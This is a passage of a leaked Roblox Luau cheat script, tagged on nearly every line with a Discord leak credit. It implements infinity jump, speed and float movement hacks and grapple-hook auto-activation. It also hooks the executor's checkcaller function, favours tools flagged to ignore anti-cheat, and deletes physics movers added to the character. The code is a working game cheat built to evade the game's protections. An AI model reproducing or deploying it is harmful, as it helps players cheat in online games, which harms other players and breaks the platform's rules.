					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (slicedn13 - assemblyLinearVelocity.Y) * (1 - math.exp(-slicedn6 * sliced14 * slicedn3)) - slicedn19, assemblyLinearVelocity.Z)
				end
			elseif not flag7 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				local gravity = Workspace.Gravity

				if assemblyLinearVelocity.Y < 0 then
					gravity += slicedn10
				end

				local slicedn19 = gravity * sliced14 * sliced14 - Workspace.Gravity

				if math.abs(slicedn19) > 0.001 then
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - slicedn19 * slicedn3, assemblyLinearVelocity.Z)
				end
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn11(deltaTime)
			if not flag2 or not flag then
				return
			end
			slicedn16 += deltaTime
			if slicedn16 < slicedn3 then
				return
			end
			local slicedn19 = math.floor(slicedn16 / slicedn3)

			if slicedn4 < slicedn19 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn16 = 0
				slicedn19 = 4
			else
				slicedn16 -= slicedn19 * slicedn3
			end

			for i_ = 1, slicedn19 do
				slicedfn10()
			end
		end

		local function slicedfn12(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not flag2 then
				return Enum.ContextActionResult.Pass
			end

			if arg2 == Enum.UserInputState.Begin then
				local now = os.clock()

				if slicedn9 <= now - slicedn14 then
					slicedn14 = now
					flag4 = true
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
					slicedfn9()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			elseif arg2 == Enum.UserInputState.End or arg2 == Enum.UserInputState.Cancel then
				flag4 = false
			end

			return Enum.ContextActionResult.Pass
		end

		local function slicedfn13()
			if flag3 then
				ContextActionService:UnbindAction("ChilliInfinityJump2")
				flag3 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn14()
			slicedfn13()
			ContextActionService:BindAction("ChilliInfinityJump2", slicedfn12, false, Enum.KeyCode.Space, Enum.KeyCode.ButtonA)
			flag3 = true
		end

		local function slicedfn15(arg)
			if connection3 then
				connection3:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if connection4 then
				connection4:Disconnect()
			end

			connection3 = arg.InputBegan:Connect(function(input)
				if not flag2 or input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end
				local now = os.clock()

				if now - slicedn14 >= slicedn9 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn14 = now
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
					slicedfn9()
				end

				flag4 = true
			end)

			connection4 = arg.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag4 = false
			end)
		end

		local function slicedfn16()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end
		end

		local function slicedfn17(arg)
			return (arg:IsA("ImageButton") or arg:IsA("TextButton")) and arg.Name:lower():find("jump", 1, true) ~= nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn18()
			slicedfn16()
			if not UserInputService.TouchEnabled then
				return
			end
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			if not playerGui then
				return
			end
			local touchGui = playerGui:FindFirstChild("TouchGui", true)  -- LEAKED BY SLICED | discord.gg/pubmethod

			if touchGui then
				for _, descendant in ipairs(touchGui:GetDescendants()) do
					if slicedfn17(descendant) then
						slicedfn15(descendant)
						break
					end
				end
			end

			connection5 = playerGui.DescendantAdded:Connect(function(descendant)
				if flag2 and slicedfn17(descendant) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn15(descendant)
				end
			end)
		end

		local function slicedfn19(arg)
			humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:WaitForChild("HumanoidRootPart", 5)
			flag4 = false
			flag5 = false
			y = humanoidRootPart and humanoidRootPart.Position.Y or nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedn16 = 0
		end

		local function slicedfn20()
			flag2 = false
			flag4 = false
			flag5 = false

			if connection then
				connection:Disconnect()
				connection = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			slicedfn13()
			slicedfn16()
			humanoid = nil
			humanoidRootPart = nil
		end

		local function slicedfn21()  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn20()
			flag2 = true

			if localPlayer.Character then
				slicedfn19(localPlayer.Character)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function(character_)
				if flag2 then
					slicedfn19(character_)
				end
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn14()
			slicedfn18()
			connection = RunService.Heartbeat:Connect(slicedfn11)
		end

		slicedfn2(slicedfn20)

		sliced13:CreateSlider({
			Name = "Jump Speed",
			ShowWhen = sliced13:CreateToggle({
				Name = "Infinity Jump",
				Default = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
				Callback = function(arg)
					if arg then
						slicedfn21()
					else
						slicedfn20()
					end
				end,
			}),
			Min = 20,
			Max = 100,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Default = 60,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Changes jump timing while preserving the height of the original 60 speed.",
			Callback = function(arg)
				slicedn17 = math.clamp(tonumber(arg) or 60, 20, 100)
			end,
		})

		sliced13:CreateSlider({
			Name = "Jump Height",  -- LEAKED BY SLICED | discord.gg/pubmethod
			ShowWhen = sliced13:CreateToggle({
				Name = "Limit Jump Height",
				Default = false,
				Note = "Limits the height of each jump. Leave this off to keep air jumping upward.",
				Callback = function(arg)
					flag6 = arg == true
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
				end,
			}),
			Min = 1,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Max = 21,
			Default = 19.1,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				slicedn18 = math.clamp(tonumber(arg) or 19.1, 1, 21)
			end,
		})
	end

	floatSpeedToolBridge = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
	local slicedn3 = 0.3
	local slicedn4 = 200
	local slicedn5 = 0.05
	local slicedn6 = 0.02
	local slicedn7 = 0.5
	local slicedn8 = 0.5
	local slicedn9 = 2
	local slicedn10 = 14
	local slicedn11 = 2
	local slicedn12 = 19.1  -- LEAKED BY SLICED | discord.gg/pubmethod
	local slicedn13 = 0.2
	local slicedn14 = 0
	local slicedn15 = 0.52
	local slicedn16 = 52
	local slicedn17 = 28
	local slicedn18 = 240
	local slicedn19 = 185
	local flag2 = false
	local flag3 = true
	local flag4 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
	local flag5 = false
	local slicedn20 = slicedn17 - slicedn8
	local slicedn21 = 1
	local str = "Bottom"
	local now = os.clock()
	local sliced14 = nil
	local sliced15 = nil
	local y = nil
	local now2 = os.clock()
	local slicedn22 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
	local str2 = "Grapple Hook"
	local sliced16, slicedn23, sliced17, sliced18, flag6, flag7, sliced19, sliced20, flag8, flag9
	local connection, connection2, connection3, connection4, connection5, flag10, flag11, slicedn24, slicedfn8

	do
		local slicedn25 = 0.8
		sliced16 = nil
		slicedn23 = 0
		local flag12 = false
		sliced17 = nil
		sliced18 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		flag6 = false
		flag7 = localPlayer:GetAttribute("Stealing") == true
		sliced19 = nil
		sliced20 = nil
		flag8 = false
		flag9 = false
		local connection6 = nil
		local sliced21 = nil
		connection = nil
		connection2 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		connection3 = nil
		connection4 = nil
		connection5 = nil
		local connection7 = nil
		local flag13 = false
		flag10 = false
		flag11 = false
		slicedn24 = 0
		local flag14 = false
		local sliced22 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local tbl3 = {}
		local tbl4 = {}
		local sliced23 = nil
		local connection8 = nil
		local raycastParams = RaycastParams.new()
		local sliced24 = nil
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.IgnoreWater = true

		pcall(function()
			raycastParams.RespectCanCollide = true  -- LEAKED BY SLICED | discord.gg/pubmethod
		end)

		local function slicedfn9()
			local character_ = localPlayer.Character
			if not character_ then
				return nil, nil
			end
			local findFirstChildOfClass = character_.FindFirstChildOfClass
			return character_:FindFirstChild("HumanoidRootPart"), findFirstChildOfClass(character_, "Humanoid")
		end

		slicedfn8 = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			return arg and arg:IsA("Tool")
		end

		local function slicedfn10()
			local tbl5 = {}
			local items = ReplicatedStorage:FindFirstChild("Items")

			if items then
				for _, child in ipairs(items:GetChildren()) do
					if child:IsA("Tool") and child:GetAttribute("IgnoreAntiCheat") == true then
						tbl5[child.Name] = true
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			local tbl6 = {}

			for k in pairs(tbl5) do
				if k ~= str2 and slicedfn8(slicedfn4(k)) then
					tbl6[#tbl6 + 1] = k
				end
			end

			table.sort(tbl6, function(arg, arg2)
				return string.lower(arg) < string.lower(arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			tbl6[#tbl6 + 1] = str2
			return tbl6, tbl6[1] or "Grapple Hook"
		end

		local sliced25, sliced26 = slicedfn10()
		local flag15 = sliced26 == str2 and slicedn18 or slicedn19

		local function slicedfn11()
			local flag16 = sliced26 == str2
			local slicedn26 = flag16 and 270 or 210
			flag15 = math.clamp(flag16 and slicedn18 or slicedn19, 50, slicedn26)  -- LEAKED BY SLICED | discord.gg/pubmethod

			if sliced20 then
				sliced20:SetRange(50, slicedn26, false)
				sliced20:Set(flag15, false)
			end
		end

		local function slicedfn12()
			sliced23 = nil

			if connection8 then
				connection8:Disconnect()
				connection8 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			for k, sliced27 in pairs(tbl3) do
				pcall(function()
					k.Attachment0 = sliced27.Attachment0
					k.Attachment1 = sliced27.Attachment1
					k.Enabled = sliced27.Enabled
				end)
			end

			table.clear(tbl3)

			for k, sliced27 in pairs(tbl4) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				pcall(function()
					k.Volume = sliced27
				end)
			end

			table.clear(tbl4)
		end

		local function slicedfn13(arg)
			if sliced23 == arg then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn12()
			sliced23 = arg
			local handle = arg:FindFirstChild("Handle")
			local beam = handle and handle:FindFirstChild("Beam")

			if beam and beam:IsA("Beam") then
				tbl3[beam] = { Enabled = beam.Enabled, Attachment0 = beam.Attachment0, Attachment1 = beam.Attachment1 }
				beam.Enabled = false
				beam.Attachment0 = nil

				connection8 = beam:GetPropertyChangedSignal("Enabled"):Connect(function()
					if sliced23 == arg and beam.Enabled then  -- LEAKED BY SLICED | discord.gg/pubmethod
						beam.Enabled = false
					end
				end)
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Sound") then
					tbl4[descendant] = descendant.Volume
					descendant.Volume = 0
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn14()
			if type(hookfunction) ~= "function" or type(checkcaller) ~= "function" or type(newcclosure) ~= "function" then
				return false
			end

			if sliced22 then
				flag14 = true
				local flag16 = false

				pcall(function()
					flag16 = checkcaller() == false  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				flag14 = false
				if flag16 then
					return true
				end
				sliced22 = nil
			end

			return pcall(function()
				sliced22 = hookfunction(checkcaller, newcclosure(function()
					if flag14 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return false
					end
					return sliced22()
				end))
			end) and sliced22 ~= nil
		end

		local function slicedfn15(arg)
			if not arg or arg.Parent ~= localPlayer.Character then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag14 = true

			pcall(function()
				arg:Deactivate()
				arg:Activate()
			end)

			if type(firesignal) == "function" then
				pcall(function()
					firesignal(arg.Activated)
				end)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if type(getconnections) == "function" then
				pcall(function()
					local sliced27 = getconnections(arg.Activated)

					if type(sliced27) == "table" then
						for _, sliced28 in ipairs(sliced27) do
							if sliced28.Enabled then
								if type(sliced28.Fire) == "function" then
									sliced28:Fire()
								elseif type(sliced28.Function) == "function" then
									sliced28.Function()  -- LEAKED BY SLICED | discord.gg/pubmethod
								end
							end
						end
					end
				end)
			end

			flag14 = false
		end

		local function slicedfn16(arg)
			if not (flag10 or flag11) or not arg or arg.Parent ~= localPlayer.Character or arg:GetAttribute("CooldownTime") ~= nil then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			slicedn24 = os.clock() + slicedn25
			slicedfn15(arg)
		end

		local function slicedfn17()
			sliced21 = nil

			if connection6 then
				connection6:Disconnect()
				connection6 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn18(arg)
			if sliced21 == arg then
				return
			end
			slicedfn17()
			sliced21 = arg

			connection6 = arg:GetAttributeChangedSignal("CooldownTime"):Connect(function()
				if (flag10 or flag11) and arg:GetAttribute("CooldownTime") == nil then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn16(arg)
				end
			end)
		end

		local function slicedfn19()
			if not flag9 then
				return
			end
			flag9 = false
			local sliced27, sliced28 = slicedfn9()  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not sliced27 or not sliced28 or sliced28.Health <= 0 then
				return
			end
			local assemblyLinearVelocity = sliced27.AssemblyLinearVelocity
			local moveDirection = sliced28.MoveDirection
			local vector = Vector3.zero

			if moveDirection.Magnitude > 0.001 then
				vector = moveDirection.Unit * sliced28.WalkSpeed
			end

			sliced27.AssemblyLinearVelocity = Vector3.new(vector.X, assemblyLinearVelocity.Y, vector.Z)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn20()
			slicedfn19()
			flag5 = false
			flag8 = false
			flag10 = false
			sliced16 = nil

			if not flag11 then
				slicedn24 = 0
				slicedfn17()  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn12()
			end
		end

		local function slicedfn21()
			slicedfn20()

			if sliced17 then
				sliced17:Set(false, true)
			end
		end

		local function slicedfn22()  -- LEAKED BY SLICED | discord.gg/pubmethod
			if flag12 then
				return
			end
			flag12 = true

			task.defer(function()
				flag12 = false
				slicedfn21()
			end)
		end

		local function slicedfn23(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if arg == str2 and arg2 == "rebirth" then
				v.Notify("Tool unavailable", "Grapple Hook requires 3 Rebirths.", 5)
				return
			end
			slicedfn6(arg, arg2)
		end

		local function slicedfn24(arg)
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or humanoid.Health <= 0 or not slicedfn8(arg) then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return nil
			end
			slicedn23 = os.clock() + 1.5
			if arg.Parent == character_ then
				return arg
			end

			if not (character_:FindFirstChild("RightHand") or character_:FindFirstChild("Right Arm")) then
				if not character_:WaitForChild("RightHand", 1.5) then
					character_:WaitForChild("Right Arm", 1.5)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			pcall(function()
				humanoid:EquipTool(arg)
			end)

			local now3 = os.clock()

			while os.clock() - now3 < 0.6 do
				if arg.Parent ~= character_ then
					RunService.Heartbeat:Wait()
					continue
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				break
			end

			if arg.Parent ~= character_ and humanoid.Health > 0 then
				pcall(function()
					humanoid:EquipTool(arg)
				end)

				local now4 = os.clock()

				while os.clock() - now4 < 0.6 do
					if arg.Parent ~= character_ then
						RunService.Heartbeat:Wait()  -- LEAKED BY SLICED | discord.gg/pubmethod
						continue
					end
					break
				end
			end

			if arg.Parent ~= character_ then
				pcall(function()
					arg.Parent = character_
				end)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if arg.Parent == character_ then
				RunService.Heartbeat:Wait()
				return arg
			end
			local sliced27 = character_:FindFirstChild(sliced26)
			return slicedfn8(sliced27) and sliced27 or nil
		end

		local function slicedfn25()
			local grappleHook = slicedfn4(sliced26)

			if not slicedfn8(grappleHook) and sliced26 == str2 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced27
				grappleHook, sliced27 = slicedfn5("Grapple Hook")
				if not slicedfn8(grappleHook) then
					slicedfn23("Grapple Hook", sliced27)
					return false
				end
			elseif not slicedfn8(grappleHook) then
				v.Notify("Tool unavailable", sliced26 .. " is not currently owned.", 5)
				return false
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			sliced16 = slicedfn24(grappleHook)
			if not sliced16 then
				v.Notify("Tool unavailable", "Unable to equip " .. sliced26 .. " right now.", 5)
				return false
			end
			flag5 = true
			flag8 = true

			if sliced26 == str2 then
				slicedfn14()
				flag10 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn13(sliced16)
				slicedfn18(sliced16)
				slicedfn16(sliced16)
			end

			return true
		end

		local function slicedfn26()
			local sliced27, sliced28 = slicedfn10()
			local sliced29, sliced30, sliced31 = ipairs(sliced27)
			local flag16 = false  -- LEAKED BY SLICED | discord.gg/pubmethod

			for _, sliced32 in sliced29, sliced30, sliced31 do
				if sliced32 == sliced26 then
					flag16 = true
					break
				end
			end

			if not flag16 then
				sliced26 = sliced28

				if flag5 then
					slicedfn22()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			slicedfn11()

			if sliced19 then
				sliced19:SetOptions(sliced27, sliced26, false)
			end
		end

		local function slicedfn27()
			if flag13 then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			flag13 = true

			task.defer(function()
				flag13 = false
				slicedfn26()
			end)
		end

		local function slicedfn28(arg)
			if connection then
				connection:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if connection2 then
				connection2:Disconnect()
			end

			if connection3 then
				connection3:Disconnect()
			end

			connection = arg.DescendantAdded:Connect(function(descendant)
				if not (flag10 or flag11) or os.clock() > slicedn24 then
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				if not (descendant:IsA("BodyMover") or descendant:IsA("Constraint")) then
					return
				end

				task.defer(function()
					if descendant.Parent then
						pcall(function()
							descendant:Destroy()
						end)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end)

			connection2 = arg.ChildAdded:Connect(function(child)
				slicedfn27()
				local humanoid = arg:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local sliced27 = flag5

				if not flag5 then
					humanoid = sliced27
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				if humanoid and child:IsA("Tool") and child.Name ~= sliced26 and not slicedfn7() and os.clock() >= slicedn23 then
					slicedfn22()
				end
			end)

			connection3 = arg.ChildRemoved:Connect(function(child)
				slicedfn27()
				local humanoid = arg:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local sliced27 = flag5

				if not flag5 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					humanoid = sliced27
				end

				if humanoid and child == sliced16 and not slicedfn7() and os.clock() >= slicedn23 then
					task.defer(function()
						local character_ = localPlayer.Character
						local humanoid2 = character_ and character_:FindFirstChildOfClass("Humanoid")
						if not humanoid2 or humanoid2.Health <= 0 then
							return
						end
						character_ = character_ and character_:FindFirstChild(sliced26)  -- LEAKED BY SLICED | discord.gg/pubmethod

						if flag5 and not slicedfn8(character_) then
							slicedfn22()
						end
					end)
				end
			end)
		end

		local function slicedfn29(arg)
			if connection4 then
				connection4:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			if connection7 then
				connection7:Disconnect()
				connection7 = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if arg then
				connection4 = arg.ChildAdded:Connect(slicedfn27)
				connection5 = arg.ChildRemoved:Connect(slicedfn27)
			end
		end

		if localPlayer.Character then
			slicedfn28(localPlayer.Character)
		end

		local backpack = localPlayer:FindFirstChildOfClass("Backpack")

		if backpack then  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn29(backpack)
		end

		connection7 = localPlayer.ChildAdded:Connect(function(child)
			if child:IsA("Backpack") then
				slicedfn29(child)
				slicedfn27()
			end
		end)

		local function slicedfn30(arg, arg2)
			str = arg  -- LEAKED BY SLICED | discord.gg/pubmethod
			now = arg2
			sliced14 = nil
		end

		local function slicedfn31(arg, arg2)
			if not arg then
				sliced14 = nil
				return false
			end
			local sliced27 = sliced14
			local sliced28  -- LEAKED BY SLICED | discord.gg/pubmethod

			if sliced14 then
				sliced28 = sliced27
			else
				sliced28 = arg2
			end

			sliced14 = sliced28
			return arg2 - sliced14 >= slicedn6
		end

		local function slicedfn32(arg, arg2)
			local assemblyLinearVelocity = arg.AssemblyLinearVelocity  -- LEAKED BY SLICED | discord.gg/pubmethod
			arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, arg2, assemblyLinearVelocity.Z)
		end

		local function slicedfn33(arg, arg2)
			local parent = arg.Parent

			if sliced24 ~= parent then
				sliced24 = parent
				raycastParams.FilterDescendantsInstances = { parent }
			end

			local slicedn26

			if arg2.RigType == Enum.HumanoidRigType.R6 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn26 = 3
			else
				slicedn26 = math.max(arg.Size.Y * 0.5, arg2.HipHeight + arg.Size.Y * 0.5)
			end

			local hit = Workspace:Raycast(arg.Position, Vector3.new(0, -(slicedn26 + slicedn7), 0), raycastParams)
			return hit ~= nil and hit.Normal.Y > 0.15
		end

		local connection9 = RunService.Heartbeat:Connect(function(deltaTime)
			local sliced27, sliced28 = slicedfn9()
			local now3 = os.clock()  -- LEAKED BY SLICED | discord.gg/pubmethod

			if not sliced27 or not sliced28 or sliced28.Health <= 0 then
				sliced15 = nil
				y = nil
				slicedn22 = 0
				return
			end

			if sliced27 ~= sliced15 or not y then
				sliced15 = sliced27
				y = sliced27.Position.Y
				now2 = now3  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn22 = 0
				slicedfn30("Bottom", now3)
			else
				local slicedn26 = now3 - now2

				if slicedn26 > 0 then
					slicedn22 = (sliced27.Position.Y - y) / slicedn26
				end

				y = sliced27.Position.Y
				now2 = now3
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if flag2 then
				local slicedn26 = math.max(0.02, slicedn3 / slicedn15)
				local slicedn27 = math.max(0.01, slicedn5 / slicedn15)
				local slicedn28 = slicedn4 * slicedn15
				local slicedn29 = now3 - now

				if str == "Rise" then
					local slicedn30 = math.clamp(slicedn29 / slicedn26, 0, 1)
					local slicedn31 = slicedn12 * 3.1415926535897931 / (2 * slicedn26) * math.cos(slicedn30 * 3.1415926535897931 * 0.5)

					if slicedfn31(slicedn29 >= 0.06 and slicedn31 >= slicedn10 and math.abs(slicedn22) <= slicedn11, now3) then
						slicedfn30("Fall", now3)  -- LEAKED BY SLICED | discord.gg/pubmethod
					elseif slicedn30 >= 1 then
						slicedfn30("Hold", now3)
						slicedfn32(sliced27, 0)
					else
						slicedfn32(sliced27, slicedn31)
					end
				elseif str == "Hold" then
					if slicedn13 <= slicedn29 then
						slicedfn30("Fall", now3)
					else  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn32(sliced27, 0)
					end
				elseif str == "Fall" then
					local slicedn30 = math.clamp(slicedn29 / slicedn27, 0, 1)
					local slicedn31 = -slicedn28 * math.sin(slicedn30 * 3.1415926535897931 * 0.5)

					if slicedfn31(slicedn29 >= 0.01 and slicedn31 <= -slicedn10 and slicedn22 >= -slicedn11, now3) or slicedn30 >= 1 then
						slicedfn30("Bottom", now3)
					else
						slicedfn32(sliced27, slicedn31)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				else
					sliced14 = nil

					if slicedn29 >= slicedn14 and slicedfn33(sliced27, sliced28) then
						slicedfn30("Rise", now3)
					end
				end
			else
				sliced14 = nil

				if str ~= "Bottom" then
					slicedfn30("Bottom", now3)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			if flag5 then
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

				if not (humanoid and humanoid.Health > 0) then
					flag8 = false
					slicedn23 = math.max(slicedn23, now3 + 1.5)
				else
					local tool = character_:FindFirstChildWhichIsA("Tool")  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag8 = tool ~= nil and tool.Name == sliced26

					if not tool or tool.Name ~= sliced26 then
						if not slicedfn7() and now3 >= slicedn23 then
							slicedfn22()
						end
					elseif sliced26 == str2 then
						sliced16 = tool
						flag10 = true
						slicedfn13(tool)
						slicedfn18(tool)  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn16(tool)
					end
				end
			else
				flag8 = false
			end

			local flag16 = localPlayer:GetAttribute("Stealing") == true
			local flag17 = flag16 and not flag7
			flag7 = flag16

			if flag17 and flag3 and sliced18 and (not flag4 or sliced18:Get() ~= true) and not flag6 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag6 = true

				task.defer(function()
					flag6 = false
					if not flag or localPlayer:GetAttribute("Stealing") ~= true or not flag3 or not sliced18 then
						return
					end

					if sliced18:Get() ~= true then
						sliced18:Set(true, true)
					else
						flag4 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedn20 = math.max(20, slicedn17 - slicedn8)
						slicedn21 = 1
					end
				end)
			end

			local sliced29 = flag16 and flag4
			local flag18 = flag5 and flag8 and not flag16

			if flag18 then
				local assemblyLinearVelocity = sliced27.AssemblyLinearVelocity
				local moveDirection = sliced28.MoveDirection  -- LEAKED BY SLICED | discord.gg/pubmethod
				local vector = Vector3.zero

				if moveDirection.Magnitude > 0.001 then
					vector = moveDirection.Unit * flag15
				end

				sliced27.AssemblyLinearVelocity = Vector3.new(vector.X, assemblyLinearVelocity.Y, vector.Z)
				flag9 = true
			else
				slicedfn19()
			end

			local sliced30  -- LEAKED BY SLICED | discord.gg/pubmethod

			if sliced29 then
				local slicedn26 = math.max(20, slicedn17 - slicedn8)

				if slicedn17 <= slicedn26 then
					slicedn20 = slicedn17
				else
					slicedn20 += slicedn21 * slicedn9 * deltaTime

					if slicedn17 <= slicedn20 then
						slicedn20 = slicedn17
						slicedn21 = -1
					elseif slicedn20 <= slicedn26 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedn20 = slicedn26
						slicedn21 = 1
					end
				end

				sliced30 = slicedn20
			else
				local flag19 = not flag16 and flag3 and not flag18
				sliced30 = nil

				if flag19 then
					sliced30 = slicedn16  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			if sliced30 then
				local moveDirection = sliced28.MoveDirection
				local slicedn26 = sliced30 - sliced28.WalkSpeed

				if moveDirection.Magnitude > 0.001 and math.abs(slicedn26) > 0.001 then
					sliced27.CFrame = sliced27.CFrame + moveDirection * slicedn26 * deltaTime
				end
			end
		end)  -- LEAKED BY SLICED | discord.gg/pubmethod

		local connection10 = localPlayer.CharacterAdded:Connect(function(character_)
			sliced15 = nil
			y = nil
			slicedfn17()
			slicedfn12()
			sliced16 = nil
			flag8 = false
			slicedn23 = os.clock() + 3
			slicedfn28(character_)
			local backpack2 = localPlayer:FindFirstChildOfClass("Backpack")  -- LEAKED BY SLICED | discord.gg/pubmethod

			if backpack2 then
				slicedfn29(backpack2)
			end

			slicedfn27()

			if flag5 then
				task.spawn(function()
					local humanoid = character_:WaitForChild("Humanoid", 3)
					if not humanoid then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if not character_:WaitForChild("HumanoidRootPart", 3) then
						return
					end
					local now3 = os.clock()
					local grappleHook

					while true do
						grappleHook = slicedfn4(sliced26)

						if slicedfn8(grappleHook) then
							break
						else  -- LEAKED BY SLICED | discord.gg/pubmethod
							task.wait(0.1)
							if not (slicedfn8(grappleHook) or os.clock() - now3 >= 3 or not flag5) then
								continue
							end
							break
						end
					end

					if not flag5 then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if not slicedfn8(grappleHook) and sliced26 == str2 then
						grappleHook = slicedfn5("Grapple Hook")
					end

					if slicedfn8(grappleHook) and flag5 and humanoid.Health > 0 then
						task.wait(0.15)
						sliced16 = slicedfn24(grappleHook)

						if sliced16 then
							flag8 = true

							if sliced26 == str2 then
								slicedfn14()  -- LEAKED BY SLICED | discord.gg/pubmethod
								flag10 = true
								slicedfn13(sliced16)
								slicedfn18(sliced16)
								RunService.Heartbeat:Wait()
								slicedfn16(sliced16)
							end
						else
							slicedfn21()
						end
					elseif flag5 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn21()
					end
				end)
			end
		end)

		slicedfn2(function()
			flag2 = false
			flag3 = false
			flag4 = false
			flag11 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn20()
			flag14 = false

			if sliced22 then
				pcall(function()
					hookfunction(checkcaller, sliced22)
				end)
			end

			if connection10 then
				connection10:Disconnect()
				connection10 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

